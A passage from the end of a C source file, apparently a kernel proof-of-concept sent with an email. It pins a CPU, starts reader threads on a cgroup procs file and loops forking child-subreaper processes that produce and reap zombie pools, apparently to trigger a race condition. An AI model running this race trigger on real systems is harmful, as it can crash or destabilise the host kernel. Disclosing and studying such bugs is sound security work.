    prctl(PR_SET_CHILD_SUBREAPER, 1);
    signal(SIGCHLD, SIG_IGN);
    pid_t f = fork();
    if (f == 0) {
        zombie_factory();
        _exit(0);
    }
    if (f > 0)
        while (wait(0) > 0)   // ends in ECHILD once the pool is reaped
            ;
    _exit(0);
}

static int envi(const char *k, int def)
{
    const char *v = getenv(k);
    return v ? atoi(v) : def;
}

int main(void)
{
    PIN_CPU  = envi("POC_CPU", PIN_CPU);
    READERS  = envi("POC_READERS", READERS);
    M        = envi("POC_M", M);
    PARALLEL = envi("POC_PARALLEL", PARALLEL);

    pin_self();
    int on = verify_pinned();
    find_cgroup();
    fprintf(stderr, "poc: uid=%d cpu=%d (running on %d) readers=%d M=%d parallel=%d\npoc: iterating %s\n",
        (int)getuid(), PIN_CPU, on, READERS, M, PARALLEL, cg_procs);

    arrived = mmap(0, sizeof *arrived, PROT_READ | PROT_WRITE,
               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (arrived == MAP_FAILED)
        return 1;

    for (int i = 0; i < READERS; i++) {
        pthread_t t;
        pthread_create(&t, 0, reader, 0);
        pthread_detach(t);
    }

    for (;;) {
        __atomic_store_n(arrived, 0, __ATOMIC_SEQ_CST);
        for (int i = 0; i < PARALLEL; i++) {
            pid_t c = fork();
            if (c == 0)
                run_reaper();   // never returns
        }
        while (wait(0) > 0)
            ;
    }
    return 0;
}

--Tp3jkGR3ToKG1RWu--
